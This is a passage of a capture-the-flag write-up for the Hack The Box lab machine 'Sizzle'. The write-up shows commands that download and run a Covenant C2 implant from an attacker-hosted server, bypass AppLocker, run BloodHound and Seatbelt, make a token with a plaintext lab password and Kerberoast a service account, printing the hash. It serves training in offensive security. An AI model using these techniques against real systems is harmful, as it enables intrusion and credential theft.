 DVQQDEw1BZG1pbmlzdHJhdG9yMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr7ZFZyu8
 mFNoe53hSPGkkDBdXXfD6qxFBqvUGEH8JpMExNkFN8o793PU8eexNJ67PjBbU9+dWjX8BatmWN7zH
 BWYS9UZGc4cP3tJj4MJnYqEWWDU9ucOsWVjtPVyewnkiAjhzO1oEW5xsqGJrYVzJQQauE4u1LzmVt
 GzVsjw3uePDs0Zl9GUJa3UBThlyNWtJzcbgUH/NlHGrDe1qn4zoo/W40+TmJwI4j7bKNN2fIjl28T
 aqDRR84sLzBSGPbCq8YfdzN10OBj2CptfRm5mOOYjUPM7zbYCSsO88eAFCeQGntrkGUX3blkx05Wk
 rXoTsCeAw9s2si5vtnUtcQGGVQIDAQABo4ICnTCCApkwHQYDVR0OBBYEFAIN86PyWbS8fOkr2h5R/
 arVMKOQMB8GA1UdIwQYMBaAFEAG5FSzN5i8Ii4OGTYKGKCx3guKMIHIBgNVHR8EgcAwgb0wgbqggb
 eggbSGgbFsZGFwOi8vL0NOPUhUQi1TSVpaTEUtQ0EsQ049c2l6emxlLENOPUNEUCxDTj1QdWJsaWM
 lMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPUhUQixEQz1M
 T0NBTD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpY
 nV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxkYXA6Ly8vQ049SF
 RCLVNJWlpMRS1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXM
 sQ049Q29uZmlndXJhdGlvbixEQz1IVEIsREM9TE9DQUw/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVj
 dENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwFwYJKwYBBAGCNxQCBAoeCABVAHMAZQByMA4GA
 1UdDwEB/wQEAwIFoDApBgNVHSUEIjAgBgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwMg
 YDVR0RBCswKaAnBgorBgEEAYI3FAIDoBkMF0FkbWluaXN0cmF0b3JASFRCLkxPQ0FMMEQGCSqGSIb
 3DQEJDwQ3MDUwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG
 9w0DBzANBgkqhkiG9w0BAQsFAAOCAQEALFtWJlg2Fq0KpldEq9EGGfBRKPLJY31gyXLms8JxtQsC0
 DnEAr+LCaZinc1My1abkv/WIujjoR2cQBg73fORMO7VvsTEU49kVd+zQRPxsw31i2kXfMoNZhvZt7
 3lqihKXLIXHJiNUWe8DyHMZHRYlkqCnuCh9m8duOMuRPtb0QRvC3Wzertxj+StDUitRUQoB/fncoI
 6EjahGCkZbUecIO9RdXK25+lhwWK6mDaJc+4p9DUvlpI6p0g34gUpZbWL9JYMuIFcaiw3sMj8upLS
 CECfG1FrmXpGylK9vLmkaa0OvO/vF3/TZu/xEyvM2zx2GLcsUWKXLnbUagYUYRd92A==
distinguishedName: CN=Administrator,CN=Users,DC=HTB,DC=LOCAL
instanceType: 4
whenCreated: 20180702185650.0Z
whenChanged: 20190607033802.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=HTB,DC=LOCAL
memberOf: CN=Domain Admins,CN=Users,DC=HTB,DC=LOCAL
memberOf: CN=Enterprise Admins,CN=Users,DC=HTB,DC=LOCAL
memberOf: CN=Schema Admins,CN=Users,DC=HTB,DC=LOCAL
memberOf: CN=Administrators,CN=Builtin,DC=HTB,DC=LOCAL
uSNChanged: 118830
name: Administrator
objectGUID:: UjHz/AQBy0yNtj7H81ScqA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 131758083235357320
lastLogoff: 0
lastLogon: 131881910734009645
logonHours:: ////////////////////////////
pwdLastSet: 131758903612003865
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAi5jSjU9r5WyQ3AjV9AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 85
sAMAccountName: Administrator
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
isCriticalSystemObject: TRUE
dSCorePropagationData: 20180707172835.0Z
dSCorePropagationData: 20180702191351.0Z
dSCorePropagationData: 20180702191351.0Z
dSCorePropagationData: 20180702185837.0Z
dSCorePropagationData: 16010714042016.0Z
lastLogonTimestamp: 132043522826060184

# sizzler, Users, HTB.LOCAL
dn: CN=sizzler,CN=Users,DC=HTB,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: sizzler
distinguishedName: CN=sizzler,CN=Users,DC=HTB,DC=LOCAL
instanceType: 4
whenCreated: 20180712142949.0Z
whenChanged: 20180712150319.0Z
uSNCreated: 53442
memberOf: CN=Domain Admins,CN=Users,DC=HTB,DC=LOCAL
uSNChanged: 53450
name: sizzler
objectGUID:: ousP1Hdcx0OK9891f7jl/w==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 131758793892346397
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAi5jSjU9r5WyQ3AjVRAYAAA==
adminCount: 1
accountExpires: 0
logonCount: 0
sAMAccountName: sizzler
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
dSCorePropagationData: 20180712150319.0Z
dSCorePropagationData: 16010101000000.0Z

# search reference
ref: ldap://ForestDnsZones.HTB.LOCAL/DC=ForestDnsZones,DC=HTB,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.HTB.LOCAL/DC=DomainDnsZones,DC=HTB,DC=LOCAL

# search reference
ref: ldap://HTB.LOCAL/CN=Configuration,DC=HTB,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3
```

Going back to our WinRM shell, we can see that a number of users exist on the machine under <b>C:\</b>.

```
PS htb\amanda@SIZZLE Users>ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                                                                                                            
----                -------------         ------ ----                                                                                                                                                            
d-----         7/2/2018   4:29 PM                .NET v4.5                                                                                                                                                       
d-----         7/2/2018   4:29 PM                .NET v4.5 Classic                                                                                                                                               
d-----        8/19/2018   3:04 PM                administrator                                                                                                                                                   
d-----        9/30/2018   5:05 PM                amanda                                                                                                                                                          
d-----         7/2/2018  12:39 PM                mrlky                                                                                                                                                           
d-----        7/11/2018   5:59 PM                mrlky.HTB                                                                                                                                                       
d-r---       11/20/2016   8:24 PM                Public                                                                                                                                                          
d-----         7/3/2018  10:32 PM                WSEnrollmentPolicyServer                                                                                                                                        
d-----         7/3/2018  10:49 PM                WSEnrollmentServer          
```


Since we have access to an Active Directory environment, we can use <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank">BloodHound</a> to explore our attack vectors.

```bash
root@kali:~/htb/sizzle# mkdir www
root@kali:~/htb/sizzle# cp /opt/BloodHound/Ingestors/SharpHound.exe www
root@kali:~/htb/sizzle# cd www
root@kali:~/htb/sizzle/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Using our WinRM shell, we find a writeable directory and download SharpHound with Invoke-WebRequest.

```
PS htb\amanda@SIZZLE amanda> IWR -Uri http://10.10.14.16/SharpHound.exe -OutFile SharpHound.exe
Enter PEM pass phrase:
PS htb\amanda@SIZZLE amanda> ls


    Directory: C:\Users\amanda


Mode                LastWriteTime         Length Name                                                                                                                                                            
----                -------------         ------ ----                                                                                                                                                            
d-r---        12/2/2018   5:09 PM                Contacts                                                                                                                                                        
d-r---        12/2/2018   5:09 PM                Desktop                                                                                                                                                         
d-r---        12/2/2018   5:09 PM                Documents                                                                                                                                                       
d-r---        12/2/2018   5:09 PM                Downloads                                                                                                                                                       
d-r---        12/2/2018   5:09 PM                Favorites                                                                                                                                                       
d-r---        12/2/2018   5:09 PM                Links                                                                                                                                                           
d-r---        12/2/2018   5:09 PM                Music                                                                                                                                                           
d-r---        12/2/2018   5:09 PM                Pictures                                                                                                                                                        
d-r---        12/2/2018   5:09 PM                Saved Games                                                                                                                                                     
d-r---        12/2/2018   5:09 PM                Searches                                                                                                                                                        
d-r---        12/2/2018   5:09 PM                Videos                                                                                                                                                          
-a----         6/8/2019   9:39 PM         752640 SharpHound.exe 
```

If we attempt to run SharpHound, we find that it is blocked by group policy.

```
PS htb\amanda@SIZZLE amanda> ./SharpHound.exe
Enter PEM pass phrase:
Program 'SharpHound.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
+ ./SharpHound.exe
+ ~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./SharpHound.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```


From <a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md" target="_blank">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a>, we can check verified folders that bypass AppLocker. From this list, we can try <b>c:\windows\Temp</b>.


```
PS htb\amanda@SIZZLE amanda> cp SharpHound.exe c:\Windows\Temp
Enter PEM pass phrase:
PS htb\amanda@SIZZLE amanda> cd \windows\temp
PS htb\amanda@SIZZLE temp> .\SharpHound.exe
Initializing BloodHound at 9:48 PM on 6/8/2019
Resolved Collection Methods to Group, LocalAdmin, Session, Trusts, RDP, DCOM
Starting Enumeration for HTB.LOCAL
Status: 58 objects enumerated (+58 Infinity/s --- Using 39 MB RAM )
Finished enumeration for HTB.LOCAL in 00:00:00.2482526
0 hosts failed ping. 0 hosts timedout.

Compressing data to .\20190608214809_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!
```


From here, if we have not already set up <b>bloodhound</b> on our system, we can reference <a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/" target="_blank">https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/</a>. Once everything is set up, we can start bloodhound.

```bash
root@kali:~/htb/sizzle# neo4jconsole
```

```bash
root@kali:~/htb/sizzle# bloodhound
```

We'll need to transfer the <b>20190608214809_BloodHound.zip</b> file that SharpHound created onto our local machine. We can use <a href="https://github.com/cobbr/Covenant" target="_blank">https://github.com/cobbr/Covenant</a> and <a href="https://github.com/cobbr/Elite" target="_blank">https://github.com/cobbr/Elite</a> for this. Using docker, we first build the images of the server (Covenant) and client (Elite).

```bash
root@kali:/opt/Covenant/Covenant# docker build -t covenant .
```

```bash
root@kali:/opt/Elite/Elite# docker build -t elite .
```

Once built, we can run Covenant and Elite.

```bash
root@kali:/opt/Covenant/Covenant# docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v $(pwd)/Data:/app/Data covenant --username datkev
Password: ******
Creating cert...
Using Covenant certificate with hash: B460B10B4C1118BAE8304CF80858BF328FCD85C8
warn: Microsoft.AspNetCore.DataProtection.KeyManagement.XmlKeyManager[35]
      No XML encryptor configured. Key {209c73ba-c9bb-414e-8ad7-cfc4842d754b} may be persisted to storage in unencrypted form.
warn: Microsoft.AspNetCore.Server.Kestrel[0]
      Overriding address(es) 'http://+:80'. Binding to endpoints defined in UseKestrel() instead.
Hosting environment: Production
Content root path: /app
Now listening on: https://0.0.0.0:7443
Application started. Press Ctrl+C to shut down.
```

Notice when we run Elite, we are passing the certificate that Convenant generated to prevent MitM attacks.

```bash
root@kali:/opt/Elite/Elite# docker run -it --rm --name elite -v $(pwd)/Data:/app/Data elite --username datkev --computername 10.10.14.16
[*] Connecting to Covenant...
Password: ******
Covenant CertHash (Empty to trust all): B460B10B4C1118BAE8304CF80858BF328FCD85C8
[*] Logging in to Covenant...
(Covenant) >
```

When connected to Covenant, we set up an HTTP Listener and Binary Launcher on our machine which essentially hosts a file on our webserver. 

```bash
root@kali:/opt/Elite/Elite# docker run -it --rm --name elite -v $(pwd)/Data:/app/Data elite --username datkev --computername 10.10.14.16
[*] Connecting to Covenant...
Password: ******
Covenant CertHash (Empty to trust all): B460B10B4C1118BAE8304CF80858BF328FCD85C8
(Covenant) > show


     Help
     ==============================================
     Grunts      Displays list of connected grunts.
     Launchers   Displays list of launcher options.
     Listeners   Displays list of listeners.
     Credentials Displays list of credentials.
     Indicators  Displays list of indicators.
     Users       Displays list of Covenant users.
     Help        Display Help for this menu.
     Exit        Exit the Elite console.
     Show        Show Help menu.


(Covenant) > Listeners


     ListenerName Description
     ------------ -----------
     HTTP         Listens on HTTP protocol.


     Name TypeName Status StartTime BindAddress BindPort
     ---- -------- ------ --------- ----------- --------


(Covenant: Listeners) > HTTP


     HTTP Listener
     ===========================================
     Name:             6792816e85
     Description:      Listens on HTTP protocol.
     URL:              http://172.17.0.2:80
       ConnectAddress: 172.17.0.2
       BindAddress:    0.0.0.0
       BindPort:       80
       UseSSL:         False
     SSLCertPath:
     SSLCertPassword:  CovenantDev
     SSLCertHash:
     HttpProfile:      DefaultHttpProfile.yaml


(Covenant: Listeners\HTTP) > set ConnectAddress 10.10.14.16
(Covenant: Listeners\HTTP) > start
(Covenant: Listeners\HTTP) > back
(Covenant: Listeners) > back
(Covenant) > Launchers


     Name        Description
     ----        -----------
     Wmic        Uses wmic.exe to launch a Grunt using a COM activated Delegate and ActiveXObject...
     Regsvr32    Uses regsvr32.exe to launch a Grunt using a COM activated Delegate and ActiveXOb...
     Mshta       Uses mshta.exe to launch a Grunt using a COM activated Delegate and ActiveXObjec...
     Cscript     Uses cscript.exe to launch a Grunt using a COM activated Delegate and ActiveXObj...
     MSBuild     Uses msbuild.exe to launch a Grunt using an in-line task.
     InstallUtil Uses installutil.exe to start a Grunt via Uninstall method.
     PowerShell  Uses powershell.exe to launch a Grunt using [System.Reflection.Assembly]::Load()
     Binary      Uses a generated .NET Framework binary to launch a Grunt.
     Wscript     Uses wscript.exe to launch a Grunt using a COM activated Delegate and ActiveXObj...


(Covenant: Launchers) > Binary


     BinaryLauncher
     ===========================================================================
     Name:             Binary
     Description:      Uses a generated .NET Framework binary to launch a Grunt.
     ListenerName:
     CommType:         HTTP
       ValidateCert:   True
       UseCertPinning: True
     DotNetFramework:  v3.5
     Delay:            5
     JitterPercent:    10
     ConnectAttempts:  5000
     KillDate:         12/31/9999 23:59:59
     LauncherString:


(Covenant: Launchers\Binary) > set ListenerName 6792816e85
(Covenant: Launchers\Binary) > help


     Help
     =======================================================================
     Help                      Display Help for this menu.
     Back                      Navigate Back one menu level.
     Exit                      Exit the Elite console.
     Show                      Show BinaryLauncher options
     Generate                  Generate a BinaryLauncher
     Code     <type>           Get the currently generated GruntStager code.
     Host     <path>           Host a BinaryLauncher on an HTTP Listener
     Write    <output_file>    Write BinaryLauncher to a file
     Set      <option> <value> Set BinaryLauncher option
     Unset    <option>         Unset an option


(Covenant: Launchers\Binary) > Host sizzle.exe
[*] BinaryLauncher hosted at: http://10.10.14.16/sizzle.exe
(Covenant: Launchers\Binary) > show


     BinaryLauncher
     ===========================================================================
     Name:             Binary
     Description:      Uses a generated .NET Framework binary to launch a Grunt.
     ListenerName:     6792816e85
     CommType:         HTTP
       ValidateCert:   True
       UseCertPinning: True
     DotNetFramework:  v3.5
     Delay:            5
     JitterPercent:    10
     ConnectAttempts:  5000
     KillDate:         12/31/9999 23:59:59
     LauncherString:   sizzle.exe


(Covenant: Launchers\Binary) >
```

Now that we've hosted our file, we can download the Grunt onto the remote machine. Checking back on Elite, we can see that our binary has been activated.

```
PS htb\amanda@SIZZLE temp> IWR -Uri http://10.10.14.16/sizzle.exe -OutFile sizzle.exe
PS htb\amanda@SIZZLE temp> .\sizzle.exe
```

```bash
(Covenant: Launchers\Binary) >
[*] [06/09/2019 03:16:08 UTC] Grunt: 2895bf440e from: sizzle has been activated!
```

Then, we need to tell Elite to interact with our Grunt.
```bash
(Covenant) > Grunts


     Name       CommType ComputerName User       Status Last Check In       Integrity OperatingSystem                 Process
     ----       -------- ------------ ----       ------ -------------       --------- ---------------                 -------
     2895bf440e HTTP     sizzle       HTB\amanda Active 06/09/2019 03:19:43 Medium    Microsoft Windows NT 6.2.9200.0 sizzle


(Covenant: Grunts) > interact 2895bf440e


     Grunt: 2895bf440e
     =================================================
     Name:             2895bf440e
     CommType:         HTTP
     Connected Grunts:
     Hostname:         sizzle
     IPAdress:         10.10.10.103
     User:             HTB\amanda
     Status:           Active
     LastCheckIn:      06/09/2019 03:19:58
     ActivationTime:   06/09/2019 03:16:08
     Integrity:        Medium
     OperatingSystem:  Microsoft Windows NT 6.2.9200.0
     Process:          sizzle
     Delay:            5
     JitterPercent:    10
     ConnectAttempts:  5000
     KillDate:         12/31/9999 23:59:59
     Tasks Assigned:
     Tasks Completed:


(Covenant: Grunts\2895bf440e) > help


     Help
     ===================================================================================================================================================================
     Task                   <task_name>                                              Task a Grunt to do something.
     Help                                                                            Display Help for this menu.
     Back                                                                            Navigate Back one menu level.
     Exit                                                                            Exit the Elite console.
     Show                                                                            Show details of the Grunt.
     Kill                                                                            Kill the Grunt.
     Set                    <option> <value>                                         Set a Grunt Variable.
     whoami                                                                          Gets the username of the currently used/impersonated token.
     ls                     <path>                                                   Get a listing of the current directory.
     cd                     <append_directory>                                       Change the current directory.
     ps                                                                              Get a list of currently running processes.
     GetRegistryKey         <regpath>                                                Gets a value stored in registry.
     SetRegistryKey         <regpath> <value>                                        Sets a value into the registry.
     GetRemoteRegistryKey   <hostname> <regpath>                                     Gets a value stored in registry on a remote system.
     SetRemoteRegistryKey   <hostname> <regpath> <value>                             Sets a value into the registry on a remote system.
     Upload                 <local_file_path>                                        Upload a file.
     Download               <file_name>                                              Download a file.
     Assembly               <local_file_path> <parameters>                           Execute a .NET Assembly EntryPoint.
     AssemblyReflect        <local_file_path> <type_name> <method_name> <parameters> Execute a .NET Assembly method using reflection.
     SharpShell             <c#_code>                                                Execute C# code.
     Shell                  <shell_command>                                          Execute a Shell command.
     ShellCmd               <shell_command>                                          Execute a Shell command using "cmd.exe /c".
     PowerShell             <powershell_code>                                        Execute a PowerShell command.
     PowerShellImport       <file_path>                                              Import a local PowerShell file.
     PortScan               <computer_names> <ports> <ping>                          Conduct a TCP port scan of specified hosts and ports.
     Mimikatz               <command>                                                Execute a Mimikatz command.
     LogonPasswords                                                                  Execute the Mimikatz command "sekurlsa::logonPasswords".
     SamDump                                                                         Execute the Mimikatz command: "token::elevate lsadump::sam".
     LsaSecrets                                                                      Execute the Mimikatz command "token::elevate lsadump::secrets".
     DCSync                 <user> <fqdn> <dc>                                       Execute the Mimikatz command "lsadump::dcsync".
     Rubeus                 <command>                                                Use a Rubeus command.
     SharpDPAPI             <command>                                                Use a SharpDPAPI command.
     SharpUp                <command>                                                Use a SharpUp command.
     SafetyKatz                                                                      Use SafetyKatz.
     SharpDump              <processid>                                              Use a SharpDump command.
     SharpWMI               <command>                                                Use a SharpWMI command.
     Seatbelt               <command>                                                Use a Seatbelt command.
     Kerberoast             <usernames> <hash_format>                                Perform a "kerberoasting" attack to retreive crackable SPN tickets.
     GetDomainUser          <identities>                                             Gets a list of specified (or all) user `DomainObject`s in the current Domain.
     GetDomainGroup         <identities>                                             Gets a list of specified (or all) group `DomainObject`s in the current Domain.
     GetDomainComputer      <identities>                                             Gets a list of specified (or all) computer `DomainObject`s in the current Domain...
     GetNetLocalGroup       <computernames>                                          Gets a list of `LocalGroup`s from specified remote computer(s).
     GetNetLocalGroupMember <computernames> <localgroup>                             Gets a list of `LocalGroupMember`s from specified remote computer(s).
     GetNetLoggedOnUser     <computernames>                                          Gets a list of `LoggedOnUser`s from specified remote computer(s).
     GetNetSession          <computernames>                                          Gets a list of `SessionInfo`s from specified remote computer(s).
     ImpersonateUser        <username>                                               Find a process owned by the specified user and impersonate the token. Used to ex...
     ImpersonateProcess     <processid>                                              Impersonate the token of the specified process. Used to execute subsequent comma...
     GetSystem                                                                       Impersonate the SYSTEM user. Equates to ImpersonateUser("NT AUTHORITY\SYSTEM").
     MakeToken              <username> <domain> <password> <logontype>               Makes a new token with a specified username and password, and impersonates it to...
     RevertToSelf                                                                    Ends the impersonation of any token, reverting back to the initial token associa...
     WMICommand             <computername> <command> <username> <password>           Execute a process on a remote system using Win32_Process Create, optionally with...
     WMIGrunt               <computername> <launcher> <username> <password>          Execute a Grunt Launcher on a remote system using Win32_Process Create, optional...
     DCOMCommand            <computername> <command> <method>                        Execute a process on a remote system using various DCOM methods.
     DCOMGrunt              <computername> <launcher> <method>                       Execute a Grunt Launcher on a remote system using various DCOM methods.
     BypassUACCommand       <command>                                                Bypasses UAC through token duplication and executes a command with high integrit...
     BypassUACGrunt         <launcher>                                               Bypasses UAC through token duplication and executes a Grunt Launcher with high i...
     Connect                <computername> <pipename>                                Connect to a Grunt using a named pipe.
     Disconnect             <childgruntname>                                         Disconnect to a Grunt using a named pipe.
     History                <task>                                                   Show the output of completed task(s).
     Jobs                                                                            Get a list of actively running tasks.

```

The command, <b>Seatbelt user</b>, doesn't return anything too interesting.

```
(Covenant: Grunts\2895bf440e) > Seatbelt user
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 03:27:37 UTC] Grunt: 2895bf440e has completed GruntTasking: e43c50f886
(datkev) > Seatbelt user
=== Running User Triage Checks ===


 [*] In medium integrity, attempting triage of current user.

     Current user : HTB\amanda - S-1-5-21-2379389067-1826974543-3574127760-1104


=== Checking for Firefox (Current User) ===



=== Checking for Chrome (Current User) ===



=== Internet Explorer (Current User) Last 7 Days ===

  History:

  Favorites:
    http://go.microsoft.com/fwlink/p/?LinkId=255142


=== Checking Windows Vaults ===

  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials


  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials

  [ERROR] Unable to enumerate vault items from the following vault: Windows Credentials. Error 0x1312


=== Saved RDP Connection Information (Current User) ===


=== Recent Typed RUN Commands (Current User) ===



=== Putty Saved Session Information (Current User) ===



=== Putty SSH Host Key Recent Hosts (Current User) ===



=== Checking for Cloud Credentials (Current User) ===



=== Recently Accessed Files (Current User) Last 7 Days ===



=== Checking for DPAPI Master Keys (Current User) ===

    Folder       : C:\Users\amanda\AppData\Roaming\Microsoft\Protect\S-1-5-21-2379389067-1826974543-3574127760-1104

    MasterKey    : 28cb0453-0b71-4811-acf7-636a780ac383
        Accessed : 7/10/2018 5:00:00 PM
        Modified : 7/10/2018 5:00:00 PM

    MasterKey    : 61784342-c64c-4c2f-afae-718bbc138009
        Accessed : 6/8/2019 11:10:04 PM
        Modified : 6/8/2019 11:10:04 PM

    MasterKey    : bc700a30-a9fd-4411-bfdb-5a1ad372ee4c
        Accessed : 12/1/2018 10:02:58 PM
        Modified : 12/1/2018 10:02:58 PM

  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/rpc) to decrypt


=== Checking for Credential Files (Current User) ===

    Folder       : C:\Users\amanda\AppData\Local\Microsoft\Credentials\



=== Checking for RDCMan Settings Files (Current User) ===



[*] Completed Safety Checks in 0 seconds


(Covenant: Grunts\2895bf440e) >

```

We can attempt run BloodHound again by calling <b>SharpHound</b> locally within Elite by using the <b>Assembly</b> command.

```bash
root@kali:~# cp /opt/BloodHound/Ingestors/SharpHound.exe /opt/Elite/Elite/Data/
```

```bash
(Covenant: Grunts\2895bf440e) > Assembly /opt/Elite/Elite/Data/SharpHound.exe
[!] Invalid option "Set LocalFilePath /opt/Elite/Elite/Data/SharpHound.exe" selected. Try "help" to see a list of valid options.
[!] File: "/opt/Elite/Elite/Data/SharpHound.exe" does not exist on the local system.

(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 03:36:40 UTC] Grunt: 2895bf440e has been assigned GruntTasking: 0318c8ea48
(datkev) > Assembly /opt/Elite/Elite/Data/SharpHound.exe
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 03:36:48 UTC] Grunt: 2895bf440e has completed GruntTasking: 0318c8ea48
(datkev) > Assembly /opt/Elite/Elite/Data/SharpHound.exe
Initializing BloodHound at 11:30 PM on 6/8/2019
Resolved Collection Methods to Group, LocalAdmin, Session, Trusts, RDP, DCOM
Starting Enumeration for HTB.LOCAL
Status: 58 objects enumerated (+58 Infinity/s --- Using 73 MB RAM )
Finished enumeration for HTB.LOCAL in 00:00:00.2316126
0 hosts failed ping. 0 hosts timedout.

Compressing data to .\20190608233046_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!

(Covenant: Grunts\2895bf440e) > download 20190608233046_BloodHound.zip
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 03:40:01 UTC] Grunt: 2895bf440e has completed GruntTasking: c1d805eae0
```

We drop our zip file into the bloodhound console. 

<img src="/assets/images/ctfs/htb-sizzle/bloodhound-1.png" alt="" class="center" alt="" class="center">

Unfortunately, we can't perform many of the queries available, so we try additional collection methods with <b>SharpHound</b>.


```bash
(Covenant: Grunts\2895bf440e) > Assembly /app/Data/SharpHound.exe --CollectionMethod All,GPOLocalGroup,LoggedOn
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 03:57:21 UTC] Grunt: 2895bf440e has been assigned GruntTasking: 03acc6eb62
(datkev) > Assembly /app/Data/SharpHound.exe --CollectionMethod All,GPOLocalGroup,LoggedOn
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 03:57:32 UTC] Grunt: 2895bf440e has completed GruntTasking: 03acc6eb62
(datkev) > Assembly /app/Data/SharpHound.exe --CollectionMethod All,GPOLocalGroup,LoggedOn
Initializing BloodHound at 11:51 PM on 6/8/2019
Resolved Collection Methods to Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM
Starting Enumeration for HTB.LOCAL
Status: 61 objects enumerated (+61 Infinity/s --- Using 76 MB RAM )
Finished enumeration for HTB.LOCAL in 00:00:00.2577869
0 hosts failed ping. 0 hosts timedout.

Compressing data to .\20190608235130_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!

(Covenant: Grunts\2895bf440e) > download 20190608235130_BloodHound.zip
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 03:58:12 UTC] Grunt: 2895bf440e has been assigned GruntTasking: f3fd598bfa
(datkev) > download 20190608235130_BloodHound.zip

```

## Root Shell

This time, the queries return more information. If we query "Principals with DCSync Rights", we find that MRLKY@HTB.LOCAL can perform a <b>DCSync</b> attack when the <b>DS-Replication-Get-Changes</b> and <b>Get-Changes-All</b> rights are set. The <b>bloodhound</b> graph confirms this.

<img src="/assets/images/ctfs/htb-sizzle/bloodhound-2.png" alt="" class="center" alt="" class="center">

We authenticated to WinRM with a certificate, so we do not currently have a valid ticket with a saved password. In order to perform actions that require valid logon sessions, we'll need to make a valid token first, so the ticket can be reused. We can make a valid token in Elite first and then perform Kerberoast.

```
(Covenant: Grunts\2895bf440e) > maketoken amanda htb Ashare1972
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 04:11:16 UTC] Grunt: 2895bf440e has completed GruntTasking: dc80a1a987
(datkev) > maketoken amanda htb Ashare1972
Successfully made and impersonated token for user: htb\amanda
(Covenant: Grunts\2895bf440e) > Kerberoast
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 04:11:26 UTC] Grunt: 2895bf440e has been assigned GruntTasking: 91c32e3220
(datkev) > Kerberoast
(Covenant: Grunts\2895bf440e) >
[*] [06/09/2019 04:11:30 UTC] Grunt: 2895bf440e has completed GruntTasking: 91c32e3220
(datkev) > Kerberoast
$krb5tgs$23$*mrlky$HTB$http/sizzle$AAC8BBBBA704E5F91E68DF3A5EE8899B$9F43DC00B95478BE062C2258BAA1437D4D2689A2912FD8D577194B8720BB5AF3B61623DDB1C7F5C8972E30006E925B1E85513DDE5F5B73E6DCE64994C1213910A39647BC54F5748D2E97AC79671D35C6EF7DB31208D189E31D2F764C89B52766EA384C8859C06CDB37228C76F61455B38C083F2F583A8EB387B007FC4F37A38D4C906BD2A7FFD278C5135B0EC9C17C2F67ABC5E3330839B41CCDE025AEAFB650022D586B6C174CDA623D580732AF288B09F301DDA042B889191BB440F191791761F24D260FD7C5C134F65089E14573CBC5450BF64BEF307B503E084423201DD2FFFF47FBDBE428D5A6699DC85157446814B820DA600C1FBE825CA178A90331A8100C37435493A55438FC121E6313ECCC643C9CE20B1D54F74C3E130AE4684D873E9A2AC0B32356D7030B83FABFCF25FEA90B53D47A8F4FC9FF408FBC65EC69FF234B2ABCF81F13C9279C60A19F2478A672ED10AFDA5266B393CA4E19473A824675C6144BE2A9F746019A213029E04CAD431CB9605562F4F52224133D8BECCC6C918E786AC2C22867D28F0B37C747D57EBA700F96C8A9175886B92022A3C6D017D5389942D8F826357CA35D6B851B5A6A2A41EC05C9E8A421AF1634A5ADDFEB4F6FEF00D3ADDAABC38F7011EC82EBFA09804010394921E7872F32FFFA40AE90C3A532A3902D746E251E15380B41F8E3855E96B2EA3371BA7AA838310366EAC0F12D985A06A3EE14CE9ED4B88E6C1C038907DB9B8FFBBC17B81138BA0AD9BC80EA573AEF9829E38DDAB52714C504ACB436B472D0A1C9019982DC6978478AFAB2B22329DA6AA146F742433D30A20D1ED22F56A1B32EFCDE15636D46DE94DDA477C26EDABB357E4856921A2A512C6596B6C808ED145E48D21EC90C59C2F9C0439D4239FB0447F4088CD1FA15AE78153E7D7BACCD